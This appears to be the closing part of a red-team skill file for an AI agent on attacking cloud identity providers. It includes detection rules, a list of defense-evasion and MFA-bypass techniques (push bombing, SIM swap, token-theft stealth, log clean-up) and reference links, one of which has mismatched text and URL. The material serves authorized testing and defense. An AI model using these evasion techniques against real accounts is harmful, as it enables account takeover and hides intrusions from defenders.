- **Federation compromise**: forging SAML assertions and tampering with federation trusts are destructive operations on the trust fabric. Document every change and have a tested rollback path. Federation trust tampering is the highest-detection action — defenders see the new IssuerUri immediately.
- **AWS IAM Identity Center pivots**: assuming an AWS role from a forged SAML assertion crosses from "the IdP engagement" into "the AWS account engagement" — a different scope and contractual boundary. Confirm before crossing.
- **MFA fatigue**: push-bombing real users is harassment and may have legal implications even in authorized engagements. Use only against test accounts or with explicit user consent in scope.
- **Token exfiltration**: a stolen refresh token is a credential that grants access for hours to days. Treat it as a secret: store in a vault, rotate post-engagement, never commit to git.
- **Audit log footprint**: every Graph API call is audited in Entra ID sign-in logs. Assume actions are visible; plan detection-evasion strategy in advance and disclose in the final report.

## Detection Methods

### Identity Provider Audit Logs
- **AWS CloudTrail**: All AWS STS / IAM events; alert on `AssumeRole` chains, `GetCallerIdentity` from new regions.
- **Azure Activity Log**: Sign-in logs with anomalous geo / IP / device fingerprint; risk events in Identity Protection.
- **GCP Audit Logs**: Cloud Identity logs; alert on `SetIamPolicy` changes, service account key creation.
- **Okta System Log**: App access, user state changes, MFA device enrollment; alert on anomalous patterns.

### Behavioral Anomalies
- **Impossible travel**: Login from US + China within 1h (geographic impossibility).
- **MFA fatigue**: Multiple MFA challenges in short window (push bombing).
- **Token reuse**: Same JWT from many source IPs in short window.
- **Service account abuse**: Service account performing user-level actions (e.g., reading Gmail).
- **Permission explosion**: User suddenly granted privileged role across many resources.

### Conditional Access Policy Bypass
- **Legacy auth**: Basic authentication bypasses MFA; protocol-specific logging.
- **Device compliance bypass**: User agent strings indicating non-managed device.
- **Location bypass**: Use of residential proxies to mimic legitimate location.
- **App-specific bypass**: Use of legacy protocols (IMAP, SMTP) not subject to modern policies.

### SIEM Detection Rules
- **Splunk SPL**: `index=aws sourcetype=aws:cloudtrail eventName=AssumeRole | stats dc(sourceIPAddress) by userIdentity.arn | where dc > 5`
- **Sigma rule**: `sigma/rules/cloud/aws_sts_role_chain.yml`
- **Microsoft Entra ID Protection**: Native risk detection (impossible travel, anonymous IP, unfamiliar sign-in).
- **AWS GuardDuty**: Detects anomalous API calls; `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`.

## Defense Evasion Techniques

### Identity Evasion
- **STS role chaining**: Use assume role across multiple accounts; launder credentials.
- **Service account tokens over user credentials**: Don't trigger user-behavior analytics.
- **Long-lived credentials over STS**: Avoid assume-role audit trail.
- **Federation abuse**: Use SAML/OIDC federation; appears as legitimate SSO.
- **Web identity federation**: Use GitHub Actions OIDC, Google Cloud Build; inherit trust.

### MFA Bypass
- **Push bombing**: Trigger MFA fatigue during off-hours; user approves to silence phone.
- **SIM swap**: Social engineer mobile carrier; intercept SMS OTP.
- **MFA fatigue + helpdesk social**: Trigger fatigue, then call helpdesk claiming lost phone.
- **OAuth consent phishing**: Trick user into granting OAuth app; persistent access without MFA.
- **Session token theft**: Steal post-MFA session cookie via XSS/MITM; bypasses MFA entirely.

### Conditional Access Bypass
- **Legacy protocol abuse**: IMAP/SMTP/POP3 often exempt from modern policies.
- **Trusted IP spoofing**: X-Forwarded-For manipulation if gateway trusts header.
- **Device compliance bypass**: Register personal device as compliant; then access resources.
- **App proxy abuse**: Use legitimate reverse proxy app to bypass IP restrictions.

### Token Theft Stealth
- **Steal refresh tokens over access tokens**: Refresh tokens are longer-lived; less suspicious.
- **Off-hours token use**: Use stolen token during user's typical active window; blend with normal activity.
- **Distribute token usage across regions**: Mimic user's travel pattern; avoid impossible-travel alert.
- **Pivot through legitimate SaaS**: Use stolen token to access third-party SaaS that's pre-approved.

### Cloud Persistence Stealth
- **OAuth consent grant**: Persistent access via OAuth refresh tokens; no user account compromise needed.
- **Service principal abuse**: Create new SP with legitimate-looking name; persistent access.
- **Custom role with broad scope**: Avoid built-in privileged roles; create custom role with required permissions.
- **IMDS in cloud** (AWS): Inject into compromised EC2 to inherit instance profile; legitimate-looking workload traffic.

## Hacker Laws

- **Trust but Verify** — A stolen refresh token is not proof of live access. The token may have been revoked, the user disabled, the policy changed. Verify with a low-impact Graph call (`/me`) before treating the foothold as real.
- **Defense in Depth** — Conditional Access alone does not stop bypass. Layer CA + Continuous Access Evaluation + Identity Protection + Identity Secure Score + app consent policy + federation hygiene + service principal review + audit alerting. No single layer is sufficient.
- **Assume Breach** — Design monitoring assuming an attacker has a valid refresh token. Defender for Cloud Apps detects impossible travel, new country, new device; sign-in risk scoring catches token replay. Assume the attacker will reach the data; design to detect *when*, not *if*.
- **Least Privilege** — A user should not be Global Administrator permanently (use PIM). A service principal should not have `Application.ReadWrite.All` (use scoped app roles). A guest user should not be in privileged groups. Every over-privilege is an escalation vector.
- **Supply Chain Trust** — Every federation trust is a supply chain: AD FS trusts Entra ID, Entra ID trusts the app, the app trusts the user. A compromise at any link (stolen AD FS cert, rogue Entra ID app, phished user) propagates down the chain.
- **Minimize Attack Surface** — Disable legacy auth, block self-service app registration, require admin consent for high-priv scopes, block guest users in privileged groups, restrict PIM eligibility. Every disabled feature is one fewer entry point.
- **Information Wants to Be Free** — Refresh tokens in browser localStorage, Okta API tokens in CI environment variables, SAML assertions in logs — these are credentials in plain sight. Anyone with access reads every token.
- **Weakest Link Is Human** — Most cloud identity compromises start with a phished user (device code, consent grant, MFA fatigue), not a crypto bug in OAuth. Train users on consent prompts, push-bombing, and device codes — and rate-limit MFA prompts server-side.

## Cross-References

- **`skills/ad-ldap-attack/SKILL.md`** — On-premises Active Directory, LDAP, Kerberos, NTLM. The on-prem counterpart; this skill is the cloud counterpart. The overlap is AD FS federation compromise (on-prem AD supplies the token-signing cert, cloud Entra ID trusts the assertions).
- **`skills/cloud-security/SKILL.md`** — AWS/Azure/GCP control plane attacks (IAM, S3, IMDS, Resource Manager). The pivot destination: Entra ID compromise → Azure RM token → cloud-security takes over.
- **`skills/web-auth-bypass/SKILL.md`** — Generic web authentication flaws (session, JWT, password reset). The OAuth/OIDC/SAML protocol-level attacks live in this skill; web-auth-bypass covers application-level auth bugs.
- **`skills/password-attack/SKILL.md`** — Credential attacks (hashcat, spraying, stuffing). Password spraying against Entra ID is the bridge between the two skills.
- **`skills/post-exploitation/SKILL.md`** — General post-exploitation on hosts. This skill's persistence lives in the IdP (app registrations, federation trusts), not on a single host.
- **`skills/anti-forensics/SKILL.md`** — Cleaning up rogue app registrations, federation trust changes, PIM activations, and audit log entries post-engagement.
- **`skills/pentest-reporting/SKILL.md`** — Structuring the engagement deliverable with the cloud identity attack chain as the narrative spine.
- **`skills/digital-forensics/SKILL.md`** — Defender-side analysis of Entra ID sign-in logs, app consent history, and federation trust changes when responding to a real identity compromise.
- **`skills/supply-chain-security/SKILL.md`** — Software supply chain. The SolarWinds / Golden SAML incident is the canonical example of identity-layer supply chain attack — referenced from this skill.
- **`skills/api-security/SKILL.md`** — Generic API security. Microsoft Graph API and Okta API are REST APIs; the generic API testing techniques apply here, with identity-specific considerations (bearer tokens, consent, scope).

## Learning Resources

- **This skill's supplementary files**: `payloads.md`, `test-cases.md`
- **Deep-dive guide**: `guides/cloud-identity-attack-playbook.md` — end-to-end red team workflow with MITRE ATT&CK cloud identity matrix, per-IdP decision tree (Entra ID / Okta / Auth0 / Ping / AWS IC / Google Workspace), OAuth flow deep dive, federation compromise procedure, and report structure.
- **Reference repositories** (the inspirations for this skill):
  - ROADtools (2.6k stars): [github.com/dirkjanm/ROADtools](https://github.com/dirkjanm/ROADtools) — Azure AD attack framework
  - AADInternals: [github.com/Gerenios/AADInternals](https://github.com/Gerenios/AADInternals) — Azure AD / Microsoft 365 admin toolkit
  - MicroBurst: [github.com/NetSPI/MicroBurst](https://github.com/NetSPI/MicroBurst) — Azure reconnaissance
  - AzureAD-Attack-Defense (2.5k stars): [github.com/cyberheart/.../AzureAD-Attack-Defense](https://github.com/cyberheart/USGov-C2-Solutions) — attack/defense writeups
  - TokenTactics (FireEye/Mandiant): [github.com/fireeye/TokenTactics](https://github.com/fireeye/TokenTactics) — OAuth token phishing for Microsoft apps
  - MFASweep: [github.com/dafthack/MFASweep](https://github.com/dafthack/MFASweep) — MFA enforcement gap detection
  - AzureHound: [github.com/BloodHoundAD/AzureHound](https://github.com/BloodHoundAD/AzureHound) — BloodHound for Azure AD
  - GraphRunner: [github.com/dafthack/GraphRunner](https://github.com/dafthack/GraphRunner) — Microsoft 365 / Graph post-exploitation
  - casdoor (13.8k stars): [github.com/casdoor/casdoor](https://github.com/casdoor/casdoor) — open-source IdP (for testing)
  - ory/kratos (13.7k stars): [github.com/ory/kratos](https://github.com/ory/kratos) — open-source identity server (for testing)
  - GlobalProtect-openconnect (2.1k stars): [github.com/yuezk/GlobalProtect-openconnect](https://github.com/yuezk/GlobalProtect-openconnect) — VPN auth research
- **External resources**:
  - Microsoft Identity documentation: [learn.microsoft.com/entra](https://learn.microsoft.com/entra)
  - Microsoft Entra ID security operations guide: [learn.microsoft.com/entra/architecture/security-operations-introduction](https://learn.microsoft.com/entra/architecture/security-operations-introduction)
  - OAuth 2.0 RFC 6749: [datatracker.ietf.org/doc/html/rfc6749](https://datatracker.ietf.org/doc/html/rfc6749)
  - OpenID Connect Core 1.0: [openid.net/specs/openid-connect-core-1_0.html](https://openid.net/specs/openid-connect-core-1_0.html)
  - SAML 2.0 Core: [docs.oasis-open.org/security/saml/v2.0/saml-core-2.0-os.pdf](https://docs.oasis-open.org/security/saml/v2.0/saml-core-2.0-os.pdf)
  - CISA Advisory on LAPSUS$ (MFA fatigue, Okta): [cisa.gov/news-events/cybersecurity-advisories/aa22-040a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-040a)
  - CISA + FBI + NSA Joint Advisory on SolarWinds Golden SAML: [cisa.gov/news-events/cybersecurity-advisories/aa21-008a](https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-008a)
  - Dirkjanm's blog (ROADtools author): [dirkjanm.io](https://dirkjanm.io) — Azure AD attack research
  - Secureworks' research on Nobelji (AAD abuse): [secureworks.com/blog](https://www.secureworks.com/blog)
- **Core system files**: `SOUL.md`, `TOOLS.md`, `IDENTITY.md`
